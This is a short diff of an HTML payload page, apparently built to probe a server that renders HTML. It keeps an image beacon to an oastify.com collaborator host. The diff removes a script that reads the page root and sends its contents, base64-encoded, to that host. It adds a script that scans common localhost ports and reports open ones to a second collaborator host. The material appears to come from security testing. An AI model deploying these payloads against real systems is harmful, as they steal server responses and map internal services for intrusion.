@@ -11,12 +11,14 @@
     <h1>Hello</h1>
     <img src="https://d3h4esvh2je58ucwomm7ig844vamygm5.oastify.com/?ItsRenderingHtml">
     <script>
-        var exfil = new XMLHttpRequest();
-        exfil.open("GET", "/");
-        exfil.send();
-        exfil.onload = function () {
-            document.write('<img src="d3h4esvh2je58ucwomm7ig844vamygm5.oastify.com/?x=' + btoa(this.responseText) + '">');
-        }
+        const ports = [22, 80, 443, 8000, 8080, 3000, 5000];
+        const host = "http://localhost";
+
+        ports.forEach(port => {
+            fetch(`${host}:${port}`, { mode: "no-cors" })
+                .then(() => fetch(`https://99g0ko1d8fk1eqisuis3oce0argi4ds2.oastify.com/?open=${port}`))
+                .catch(() => { });
+        });
 
     </script>
 </body>
